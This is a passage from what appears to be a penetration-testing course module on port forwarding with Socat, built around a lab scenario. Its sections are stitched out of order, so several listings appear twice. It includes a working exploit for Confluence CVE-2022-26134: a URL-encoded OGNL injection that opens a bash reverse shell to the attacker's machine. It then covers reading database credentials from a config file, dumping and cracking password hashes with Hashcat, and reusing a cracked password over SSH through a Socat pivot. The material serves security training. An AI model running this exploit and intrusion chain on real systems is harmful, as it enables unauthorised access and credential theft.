confluence@confluence01:/opt/atlassian/confluence/bin$ 
```

> Listing 9 - The credentials found in the Confluence confluence.cfg.xml file on CONFLUENCE01.

We'll find the IP address of the database server, as well as the plain text username and password used to connect to it. We can use these credentials to authenticate to the database and continue our enumeration.

We've hit a limitation, however. CONFLUENCE01 doesn't have a PostgreSQL client installed on it. Since we are running as the low-privileged _confluence_ user, we are also unable to easily install software.

We _do_ have the PostgreSQL client _psql_ installed on our Kali machine, but we can't connect directly to PGDATABASE01 from our Kali machine, since it's only routable from CONFLUENCE01.

In this scenario, there is no firewall in place between our Kali machine and CONFLUENCE01, meaning that there is nothing stopping us from binding ports on the WAN interface of CONFLUENCE01 and connecting to them from our Kali machine.

This is exactly the type of situation in which port forwarding can be useful. We can create a port forward on CONFLUENCE01 that listens on a port on the WAN interface, then forward all packets received on this port to the PGDATABASE01 on the internal subnet. In the next section, we will use [_Socat_](http://www.dest-unreach.org/socat/doc/socat.html) to achieve this.

## 19.2.3. Port Forwarding with Socat

Now we are ready to create a port forward. We have an idea of how we want it to work: CONFLUENCE01 should listen on a port on the WAN interface and forward all packets received on this port to the PGDATABASE01 on the internal subnet. This concept is illustrated in the following diagram:

![Figure 2: The way we expect our port forward to work](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/0821666b2826564e07661eba0550c37a-PRAT2_1_1_PortForwardPlan.png)

Figure 2: The way we expect our port forward to work

We want to open TCP port 2345 on the WAN interface of CONFLUENCE01, then connect to that port from our Kali machine. We want all the packets that we send to this port to be forwarded by CONFLUENCE01 to TCP port 5432 on PGDATABASE01. Once we set up our port forward, connecting to TCP port 2345 on CONFLUENCE01 will be exactly like connecting directly to TCP port 5432 on PGDATABASE01.

As part of our enumeration of CONFLUENCE01, we'll find Socat installed. Socat is a general-purpose networking tool that can set up a simple port forward in a single command.

In this scenario, we find it already installed, but Socat does not tend to be installed by default on \*NIX systems. If not already installed, it's possible to download and run a statically linked binary version instead.

We will use Socat to configure the desired port forward on CONFLUENCE01. It will listen on a port on the WAN interface (that our Kali machine can connect to) and forward packets received on that port to PGDATABASE01.

On CONFLUENCE01, we'll start a verbose (**\-ddd**) Socat process. It will listen on TCP port 2345 (**TCP-LISTEN:2345**), fork into a new subprocess when it receives a connection (**fork**) instead of dying after a single connection, then forward all traffic it receives to TCP port 5432 on PGDATABASE01 (**TCP:10.4.50.215:5432**).

We'll listen on port 2345 since it is outside the privileged port range (0-1024), meaning elevated privileges are not required.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
<ocat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432   
2022/08/18 10:12:01 socat[46589] I socat by Gerhard Rieger and contributors - see www.dest-unreach.org
2022/08/18 10:12:01 socat[46589] I This product includes software developed by the OpenSSL Project for use in the OpenSSL Toolkit. (http://www.openssl.org/)
2022/08/18 10:12:01 socat[46589] I This product includes software written by Tim Hudson (tjh@cryptsoft.com)
2022/08/18 10:12:01 socat[46589] I setting option "fork" to 1
2022/08/18 10:12:01 socat[46589] I socket(2, 1, 6) -> 5
2022/08/18 10:12:01 socat[46589] I starting accept loop
2022/08/18 10:12:01 socat[46589] N listening on AF=2 0.0.0.0:2345
```

> Listing 10 - Running the Socat port forward command.

The network is now set up like the following diagram:

![Figure 3: Socat in place as our port forwarder](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/eb1577c7ae460992abbeee4839ffb4e3-PRAT2_1_3_PortForwardSocat.png)

Figure 3: Socat in place as our port forwarder

With the Socat process running, we can run **psql** on our Kali machine, specifying that we want to connect to CONFLUENCE01 (**\-h 192.168.50.63**) on port 2345 (**\-p 2345**) with the _postgres_ user account (**\-U postgres**). When prompted, we will enter the password, and once connected, we can run the **\\l** command to list the available databases.

```
kali@kali:~$ psql -h 192.168.50.63 -p 2345 -U postgres
Password for user postgres: 
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

postgres=# \l
                                  List of databases
    Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
------------+----------+----------+-------------+-------------+-----------------------
 confluence | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 postgres   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 template0  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
 template1  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
(4 rows)
```

> Listing 11 - Connecting to the PGDATABASE01 PostgreSQL service and listing databases using psql, through our port forward.

Success! We've connected to the PostgreSQL database through our port forward. We'll also find that we have access to the _confluence_ database.

Using our new database access, we can continue our enumeration. In the confluence database, let's query the _cwd\_user_ table. This contains the username and password hashes for all Confluence users. We'll connect to the database with the **\\c confluence** command, then run **select \* from cwd\_user;** to review everything in that table.

```
postgres=# \c confluence
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
You are now connected to database "confluence" as user "postgres".

confluence=# select * from cwd_user;

   id    |   user_name    | lower_user_name | active |      created_date       |      updated_date       | first_name | lower_first_name |   last_name   | lower_last_name |      display_name      |   lower_display_name   |           email_address            |        lower_email_address         |             external_id              | directory_id |                                credential                                 
---------+----------------+-----------------+--------+-------------------------+-------------------------+------------+------------------+---------------+-----------------+------------------------+------------------------+------------------------------------+------------------------------------+--------------------------------------+--------------+---------------------------------------------------------------------------
  458753 | admin          | admin           | T      | 2022-08-17 15:51:40.803 | 2022-08-17 15:51:40.803 | Alice      | alice            | Admin         | admin           | Alice Admin            | alice admin            | alice@industries.internal          | alice@industries.internal          | c2ec8ebf-46d9-4f5f-aae6-5af7efadb71c |       327681 | {PKCS5S2}WbziI52BKm4DGqhD1/mCYXPl06IAwV7MG7UdZrzUqDG8ZSu15/wyt3XcVSOBo6bC
 1212418 | trouble        | trouble         | T      | 2022-08-18 10:31:48.422 | 2022-08-18 10:31:48.422 |            |                  | Trouble       | trouble         | Trouble                | trouble                | trouble@industries.internal        | trouble@industries.internal        | 164eb9b5-b6ef-4c0f-be76-95d19987d36f |       327681 | {PKCS5S2}A+U22DLqNsq28a34BzbiNxzEvqJ+vBFdiouyQg/KXkjK0Yd9jdfFavbhcfZG1rHE
 1212419 | happiness      | happiness       | T      | 2022-08-18 10:33:49.058 | 2022-08-18 10:33:49.058 |            |                  | Happiness     | happiness       | Happiness              | happiness              | happiness@industries.internal      | happiness@industries.internal      | b842163d-6ff5-4858-bf54-92a8f5b28251 |       327681 | {PKCS5S2}R7/ABMLgNl/FZr7vvUlCPfeCup9dpg5rplddR6NJq8cZ8Nqq+YAQaHEauk/HTP49
 1212417 | database_admin | database_admin  | T      | 2022-08-18 10:24:34.429 | 2022-08-18 10:24:34.429 | Database   | database         | Admin Account | admin account   | Database Admin Account | database admin account | database_admin@industries.internal | database_admin@industries.internal | 34901af8-b2af-4c98-ad1d-f1e7ed1e52de |       327681 | {PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0
 1212420 | hr_admin       | hr_admin        | T      | 2022-08-18 18:39:04.59  | 2022-08-18 18:39:04.59  | HR         | hr               | Admin         | admin           | HR Admin               | hr admin               | hr_admin@industries.internal       | hr_admin@industries.internal       | 2f3cc06a-7b08-467e-9891-aaaaeffe56ea |       327681 | {PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV
 1441793 | rdp_admin      | rdp_admin       | T      | 2022-08-20 20:46:03.325 | 2022-08-20 20:46:03.325 | RDP        | rdp              | Admin         | admin           | RDP Admin              | rdp admin              | rdp_admin@industries.internal      | rdp_admin@industries.internal      | e9a9e0f5-42a2-433a-91c1-73c5f4cc42e3 |       327681 | {PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34
(6 rows)

(END)
```

> Listing 12 - The contents of the cwd\_user table in the confluence database.

We obtain multiple rows of user data. Each row contains data for a single Confluence user, including their password hash. We will use [_Hashcat_](https://hashcat.net/hashcat/) to try to crack these.

The [Hashcat mode number](https://hashcat.net/wiki/doku.php?id=example_hashes) for _Atlassian (PBKDF2-HMAC-SHA1)_ hashes is _12001_, so we can pass that to the **\-m** mode flag. After copying the hashes into a file called **hashes.txt**, we'll pass this as the first positional argument. We can then pass the **fastrack.txt** password list that's built into Kali as the final positional argument.

```
kali@kali:~$ hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt 
hashcat (v6.2.5) starting

OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=====================================================================================================================================
* Device #1: pthread-11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz, 2917/5899 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

...

{PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34:P@ssw0rd!
{PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0:sqlpass123
{PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV:Welcome1234
...
```

> Listing 13 - Hashcat having cracked the database\_admin, hr\_admin and rdp\_admin account hashes.

It appears that the password policy for this Confluence instance isn't very strong. After only a few minutes of cracking, Hashcat returns passwords for the _database\_admin_, _hr\_admin_ and _rdp\_admin_ users.

We might suspect that these passwords are reused in other places throughout the network. After some more enumeration of the internal network, we'll find PGDATABASE01 is also running an SSH server. Let's try these credentials against this SSH server. With our new port forwarding skill, we can create a port forward on CONFLUENCE01 that will allow us to SSH directly from our Kali machine to PGDATABASE01.

First, we need to kill the original Socat process listening on TCP port 2345. We'll then create a new port forward with Socat that will listen on TCP port 2222 and forward to TCP port 22 on PGDATABASE01.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
</bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22 

```

> Listing 14 - Creating a new port forward with Socat to access the SSH service on PGDATABASE01.

With our new Socat port forward set up, our network setup will be configured much like the following diagram:

![Figure 4: Using Socat to open a port forward from CONFLUENCE01 to the SSH server on PGDATABASE01](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/ae6bb27852f848e8c26cbb2eb12443fb-PRAT2_1_4_PortForwardSocatSSH.png)

Figure 4: Using Socat to open a port forward from CONFLUENCE01 to the SSH server on PGDATABASE01

There are only very minimal differences between this and the previous network setup. Instead of listening on 2345, we are listening on 2222. Instead of forwarding to TCP port 5432 on PGDATABASE01, we are forwarding to TCP port 22 on PGDATABASE01.

We'll then use our SSH client to connect to port 2222 on CONFLUENCE01, as though we are connecting directly to port 22 on PGDATABASE01. We can use the _database\_admin_ user, and the password we just cracked using Hashcat.

```
kali@kali:~$ ssh database_admin@192.168.50.63 -p2222
The authenticity of host '[192.168.50.63]:2222 ([192.168.50.63]:2222)' can't be established.
ED25519 key fingerprint is SHA256:3TRC1ZwtlQexLTS04hV3ZMbFn30lYFuQVQHjUqlYzJo.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.50.63]:2222' (ED25519) to the list of known hosts.
database_admin@192.168.50.63's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-122-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 18 Aug 2022 11:43:07 AM UTC

  System load:  0.1               Processes:               241
  Usage of /:   59.3% of 7.77GB   Users logged in:         1
  Memory usage: 16%               IPv4 address for ens192: 10.4.50.215
  Swap usage:   0%                IPv4 address for ens224: 172.16.50.215


0 updates can be applied immediately.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

database_admin@pgdatabase01:~$
```

> Listing 15 - Connecting to SSH server on PGDATABASE01, through the port forward on CONFLUENCE01.

Success! The **database\_admin** credentials have been reused here. We have managed to connect to the SSH server on PGDATABASE01 using the credentials for _database\_admin_ we found in the PostgreSQL database through the port forward we set up on CONFLUENCE01 with Socat.

In this Learning Unit, we created some simple port forwards using Socat. These allowed us to gain deeper access within a network by leveraging our existing access to a compromised host.

It should also be noted that Socat is not the only way to create port forwards on \*NIX hosts. There are several alternatives, of note:

-   [_rinetd_](https://github.com/samhocevar/rinetd) is an option that runs as a daemon. This makes it a better solution for longer-term port forwarding configurations but is slightly unwieldy for temporary port forwarding solutions.
    
-   We can combine Netcat and a [_FIFO_](https://man7.org/linux/man-pages/man7/fifo.7.html) named pipe file to create a [port forward](https://gist.github.com/holly/6d52dd9addd3e58b2fd5).
    
-   If we have root privileges, we could use iptables to create port forwards. The specific iptables port forwarding setup for a given host will likely depend on the configuration already in place. To be able to forward packets in Linux also requires enabling forwarding on the interface we want to forward on by writing "1" to **/proc/sys/net/ipv4/conf/\[interface\]/forwarding** (if it's not already configured to allow it).
    

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

Port Redirection and SSH Tunneling - Port Forwarding with Socat - VM Group

#### Labs

1.  Follow the steps in this section to set up a port forward and gain access to the _confluence_ database on PGDATABASE01 using **psql** from your Kali machine. Crack the password of the _database\_admin_ user. What is the plain text password of this account?

Answer

# 19\. Port Redirection and SSH Tunneling

In this Learning Module, we will cover the following Learning Units:

-   Port Forwarding on \*NIX and Windows Machines
-   SSH Tunneling on (and between) \*NIX and Windows Machines

## 19.1. Why Port Redirection and Tunneling?

This Learning Unit covers the following Learning Objectives:

-   Understand the difference between common network layouts
-   Consider the impact of common network security devices
-   Understand when to use port redirection and tunneling techniques

Most network environments are not -and should not be- [_flat_](https://en.wikipedia.org/wiki/Flat_network), In a flat network, all devices are able to communicate freely with each other. There is little (or no) attempt to limit the access that each device has to other devices on the same network, regardless of whether devices need to communicate during normal operations.

Flat network topology is generally considered poor security practice. Once an attacker has access to a single host, they can start communicating with every other host. From there, it will be much easier to spread through the network and start compromising other hosts.

A more securely designed network type is [_segmented_](https://en.wikipedia.org/wiki/Network_segmentation).This type of network will be broken into smaller networks, each of which is called a [_subnet_](https://en.wikipedia.org/wiki/Subnetwork). Each subnet will contain a group of devices that have a specific purpose, and devices on that subnet are only granted access to other subnets and hosts when absolutely necessary. Network segmentation severely limits attackers, because compromising a single host no longer gives them free access to every other device on the network.

As part of the network segmentation process, most network administrators will also implement controls that limit the flow of traffic into, out from, and across their networks. To enforce this, they will deploy various technologies throughout the network.

One of the most common technologies used for this is [_Firewalls_](https://en.wikipedia.org/wiki/Firewall_(computing)). Firewalls can be implemented at the endpoint software level. For example, the _Linux kernel_ has firewall capabilities that can be configured with the [_iptables_](https://en.wikipedia.org/wiki/Iptables) tool suite, while Windows offers the built-in [_Windows Defender Firewall_](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-firewall/windows-firewall-with-advanced-security). Firewalls may also be implemented as features within a piece of physical network infrastructure. Administrators may even place a standalone _hardware firewall_ in the network, filtering all traffic.

Firewalls can drop unwanted inbound packets and prevent potentially malicious traffic from traversing or leaving the network. Firewalls may prevent all but a few allowed hosts from communicating with a port on a particularly privileged server. They can also block some hosts or subnets from accessing the wider _internet_.

Most firewalls tend to allow or block traffic in line with a set of rules based on _IP addresses_ and _port numbers_, so their functionality is limited. However, sometimes more fine-grained control is required. [_Deep Packet Inspection_](https://en.wikipedia.org/wiki/Deep_packet_inspection) monitors the contents of incoming and outgoing traffic and terminates it based on a set of rules.

Boundaries that are put in place by network administrators are designed to prevent the _arbitrary movement of data into, out of, and across the network_. But, as an attacker, these are exactly the boundaries we need to traverse. We'll need to develop strategies that can help us work around network restrictions as we find them.

_Port redirection_ (a term we are using to describe various types of [_port forwarding_](https://en.wikipedia.org/wiki/Port_forwarding)) and [_tunneling_](https://en.wikipedia.org/wiki/Tunneling_protocol) are both strategies we can use to traverse these boundaries. Port redirection modifies the data flow by redirecting packets from one socket to another. Tunneling means [_encapsulating_](https://en.wikipedia.org/wiki/Encapsulation_(networking)) one type of data stream within another, for example, transporting _Hypertext Transfer Protocol_ (HTTP) traffic within a _Secure Shell_ (SSH) connection (so from an external perspective, only the SSH traffic will be visible).

In this Module, we will introduce port redirection and tunneling techniques through practical examples. We'll ease in by starting with the lowest complexity techniques, and increase complexity as we move step-by-step towards more hardened network environments. Each new technique will be applied to a new network configuration that is slightly different than the previous. The only tunneling we cover in this Module is SSH tunneling, but we will cover more advanced methods in a later Module.

The [_logical topologies_](https://en.wikipedia.org/wiki/Network_topology) we create when chaining these strategies may initially be difficult to grasp. We will be making traffic move in ways that may not be initially intuitive. We should take the time to fully understand each technique before advancing to the next. By the end of this Module, we'll have all the tools required to manipulate the flow of traffic in any given network with surgical precision.

## 19.2. Port Forwarding with Linux Tools

This Learning Unit covers the following Learning Objectives:

1.  Understand what port forwarding is
2.  Learn when to use port forwarding techniques
3.  Use Socat to set up a port forward in Linux

Port forwarding is the most fundamental technique we will examine in this Module. It's also a technique that's very commonly used in general-purpose networking. When port forwarding, we configure a host to listen on one port and relay all packets received on that port to another destination.

In normal network conditions, a network administrator might create a port forward to allow access to a web server behind a firewall. In that case, they would configure the firewall to listen on a given port on one interface and pass all packets to the web server behind it.

Many home _routers_ also provide port forwarding functionality. These can be configured to listen on a port on the Internet-facing side of the router, then forward connections from that port to another device within the home network.

How might we use port forwarding in an attack chain? In the next section, we'll consider a simple scenario.

## 19.2.1. A Simple Port Forwarding Scenario

Let's examine a port forwarding scenario. During an assessment, we find a Linux web server running a version of [_Confluence_](https://www.atlassian.com/software/confluence) vulnerable to [_CVE-2022-26134_](https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html): a pre-authentication remote code execution issue. We can exploit this vulnerability and gain a reverse shell from the server.

During our enumeration, we find that this server has two _network interfaces_: one attached to the same network our Kali machine is also on (which allowed us to route to it directly), and another on an internal subnet. In the Confluence configuration file, we also find credentials and the IP address and port for a [_PostgreSQL_](https://www.postgresql.org/) database instance on a server in that internal subnet. We want to use these credentials to gain access to the database and enumerate further.

The following diagram illustrates our current understanding of the network layout.

![Figure 1: The network layout from our perspective so far](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/9f1e3efdc5c0256e854e387e50f5a621-PRAT2_1_0_ConfluenceAndDatabaseNetworkSetup.png)

Figure 1: The network layout from our perspective so far

One of the first things to notice about this diagram is that there are two named networks: the [_Wide Area Network_](https://en.wikipedia.org/wiki/Wide_area_network) (WAN) on the left and the [_Demilitarized Zone_](https://en.wikipedia.org/wiki/DMZ_(computing)) (DMZ) on the right. Our Kali machine is in the WAN, the PostgreSQL database server PGDATABASE01 is in the DMZ, and the Confluence server CONFLUENCE01 straddles both.

A WAN is a network that is large and expansive. Some people refer to the public internet as the largest WAN in the world, and some larger organizations will refer to their large internal network as a WAN, or internal WAN. In this case, since we're simulating an attack from an external network, the WAN represents a large corporate internal network, or the internet itself.

In this module’s exercises, our Kali machine will be positioned in the WAN We can route directly from our Kali machine only to hosts also on the WAN.

A DMZ is a network containing devices that may be more exposed to a wider, less trusted network. A DMZ helps create a buffer zone between hosts on the wider, less trusted network and internal hosts. In this way, it serves a similar function to a real-world [_Demilitarized zone_](https://en.wikipedia.org/wiki/Demilitarized_zone). In this scenario, the DMZ is the buffer network segment between the WAN and whatever other internal networks we may find.

CONFLUENCE01 is straddling both the WAN and DMZ to illustrate that it can communicate on both networks. CONFLUENCE01 is also listening on TCP port 8090, illustrated by the "open socket" attached to the icon.

PGDATABASE01 is within the DMZ network boundary; it does not straddle the WAN/DMZ. Our Kali machine is not in the DMZ, so we can't directly route to PGDATABASE01. PGDATABASE01 also has an "open socket" attached to it, illustrating that there's something listening on TCP port 5432 (this is likely a PostgreSQL server, since the default port is 5432).

Since the only thing we know about PGDATABASE01 so far is that it exists, we don't yet know if it's attached to any other networks. If later we find that PGDATABASE01 is attached to other networks, we will expand our network diagram.

With the credentials we found on CONFLUENCE01, we want to try to connect to this PostgreSQL port on PGDATABASE01 from our Kali machine.

Before getting into more detail, let's set up our lab environment to recreate the scenario we've described so far.

At the end of the _Port Forwarding with Socat_ section of this Learning Unit, a group of VMs are provided that can be used to follow along with the following sections. These VMs are provided so you can gain hands-on experience with all the techniques we cover. You can start the VM group at any point and follow along at whatever pace feels comfortable.

## 19.2.2. Setting Up the Lab Environment

To gain access to CONFLUENCE01, we need to leverage the command execution vulnerability in the Confluence web application to get a reverse shell. After discovering that the Confluence web application is vulnerable to CVE-2022-26134, we'll find a blog post from [_Rapid7_](https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/) that includes a [_cURL_](https://curl.se/) command containing a [_proof-of-concept_](https://en.wikipedia.org/wiki/Proof_of_concept) payload that claims to exploit the vulnerability and return a reverse shell.

```
curl -v http://10.0.0.28:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/10.0.0.28/1270%200%3E%261%27%29.start%28%29%22%29%7D/
```

> Listing 1 - The example payload from the Rapid7 blog post.

We don't run payloads without understanding exactly what they do, so we first need to figure out what's happening in this proof-of-concept.

The verbose (**\-v**) **curl** request is being made to **http://10.0.0.28:8090**, which we assume is the blogpost author's vulnerable Confluence server. After this, the URL [_path_](https://en.wikipedia.org/wiki/Uniform_Resource_Identifier#Syntax) looks more interesting. We observe that a lot of the characters in it are [_URL encoded_](https://en.wikipedia.org/wiki/Percent-encoding), so we need to _URL decode_ them to get a clearer sense of what the payload actually does.

You can quickly URL decode strings by selecting _Decode As..._ > _URL_ in the _Decoder_ tab in [_Burp_](https://portswigger.net/burp), or using an online tool such as [_CyberChef_](https://gchq.github.io/CyberChef/) If working with sensitive information in a real corporate environment, you should avoid pasting data into online tools. However, in this case we're decoding a proof-of-concept that's already public, so we can use online tools if necessary.

After URL decoding the path, the function of the payload is clearer.

```
/${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command('bash','-c','bash -i >& /dev/tcp/10.0.0.28/1270 0>&1').start()")}/
```

> Listing 2 - The example payload URL-decoded.

The URL path is an _OGNL injection_ payload. OGNL is [_Object-Graph Notation Language_](https://en.wikipedia.org/wiki/OGNL), an expression language commonly used in Java applications. OGNL injection can take place when an application handles user input in such a way that it gets passed to the OGNL expression parser. Since it's possible to execute Java code within OGNL expressions, OGNL injection can be used to execute arbitrary code.

The OGNL injection payload itself uses Java's [_ProcessBuilder_](https://docs.oracle.com/javase/7/docs/api/java/lang/ProcessBuilder.html) class to spawn a _Bash_ interactive reverse shell (_bash -i_).

This proof-of-concept payload is almost perfect for our needs. However, we need to modify it before we can use it. This is for two reasons. First, the Confluence server that the payload is pointing to in the original payload is not where our vulnerable Confluence server is. Second, the Bash reverse shell payload is pointing at port 1270 on 10.0.0.28, which is not where our Kali machine is. We need to modify these parameters in the payload before we can reuse it to exploit CONFLUENCE01 and return a shell to our own Kali machine.

While making these modifications, we also need to take the URL encoding into account. The payload string in the proof-of-concept isn't completely URL encoded. Certain characters (notably ".", "-" and "/") are not encoded. Although it's not always the case, for _this_ exploit, this turns out to be important to the functioning of the payload. If any of these characters are encoded, the server will parse the URL differently, and the payload may not execute. This means we can't apply URL encoding across the whole payload once we've modified it.

Keeping this in mind, we'll manually modify the parameters we need, using the original proof-of-concept payload as our base. We can change the Confluence server IP to **192.168.50.63**, and the Bash interactive shell payload IP and port to a listener we're going to open on our Kali machine (**/dev/tcp/192.168.118.4/4444**). We'll also remove the **curl** verbosity flag. This leaves us with the following modified payload:

```
curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/
```

> Listing 3 - The modified payload.

Now that our payload is customized for our use, we can start a [_Netcat_](https://en.wikipedia.org/wiki/Netcat) listener on our Kali machine on TCP port 4444.

```
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
```

> Listing 4 - Starting Netcat listener on port 4444 on our Kali machine.

With our listener running, we'll open another shell on our Kali machine, then run the **curl** command we just constructed.

```
kali@kali:~$ curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/

kali@kali:~$ 
```

> Listing 5 - Executing the modified reverse shell payload.

The command itself doesn't return anything, but the reverse shell is caught by our listener.

```
...
listening on [any] 4444 ...
connect to [192.168.118.4] from (UNKNOWN) [192.168.50.63] 55876
bash: cannot set terminal process group (813): Inappropriate ioctl for device
bash: no job control in this shell
confluence@confluence01:/opt/atlassian/confluence/bin$ id
id
uid=1001(confluence) gid=1001(confluence) groups=1001(confluence)
```

> Listing 6 - Bash reverse shell caught by our Netcat listener, and confirmed with the id command.

The **id** command confirms that this shell is running with the privileges of the _confluence_ user. This user has quite limited privileges. Regardless, we now have a reverse shell from CONFLUENCE01 to our Kali machine.

We can now start some light enumeration of CONFLUENCE01 using our new shell. We'll check the network interfaces using **ip addr**.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ ip addr
ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:8a:54:46 brd ff:ff:ff:ff:ff:ff
    inet 192.168.50.63/24 brd 192.168.50.255 scope global ens192
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:5446/64 scope link 
       valid_lft forever preferred_lft forever
3: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:8a:c2:c9 brd ff:ff:ff:ff:ff:ff
    inet 10.4.50.63/24 brd 10.4.50.255 scope global ens224
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:c2c9/64 scope link 
       valid_lft forever preferred_lft forever
```

> Listing 7 - Enumerating network interfaces on CONFLUENCE01.

The output shows us that CONFLUENCE01 has two network interfaces: _ens192_ and _ens224_. _ens192_ has the IP address 192.168.50.63, and _ens224_ has the IP address 10.4.50.63. We can then check the routes using **ip route**.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ ip route
ip route
default via 192.168.50.254 dev ens192 proto static 
10.4.50.0/24 dev ens224 proto kernel scope link src 10.4.50.63 
10.4.50.0/24 via 10.4.50.254 dev ens224 proto static
192.168.50.0/24 dev ens192 proto kernel scope link src 192.168.50.63
```

> Listing 8 - Enumerating routes on CONFLUENCE01.

The command shows us that we should be able to access hosts in the 192.168.50.0/24 subnet through the _ens192_ interface, and hosts in the 10.4.50.0/24 subnet through the _ens224_ interface.

Continuing our enumeration, we'll find the Confluence configuration file at **/var/atlassian/application-data/confluence/confluence.cfg.xml**. While reading the contents using **cat**, we discover some plaintext database credentials located within.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ cat /var/atlassian/application-data/confluence/confluence.cfg.xml
<sian/application-data/confluence/confluence.cfg.xml   
<?xml version="1.0" encoding="UTF-8"?>

<confluence-configuration>
  <setupStep>complete</setupStep>
  <setupType>custom</setupType>
  <buildNumber>8703</buildNumber>
  <properties>
...
    <property name="hibernate.connection.password">D@t4basePassw0rd!</property>
    <property name="hibernate.connection.url">jdbc:postgresql://10.4.50.215:5432/confluence</property>
    <property name="hibernate.connection.username">postgres</property>
...
  </properties>
</confluence-configuration>
confluence@confluence01:/opt/atlassian/confluence/bin$ 
```

> Listing 9 - The credentials found in the Confluence confluence.cfg.xml file on CONFLUENCE01.

We'll find the IP address of the database server, as well as the plain text username and password used to connect to it. We can use these credentials to authenticate to the database and continue our enumeration.

We've hit a limitation, however. CONFLUENCE01 doesn't have a PostgreSQL client installed on it. Since we are running as the low-privileged _confluence_ user, we are also unable to easily install software.

We _do_ have the PostgreSQL client _psql_ installed on our Kali machine, but we can't connect directly to PGDATABASE01 from our Kali machine, since it's only routable from CONFLUENCE01.

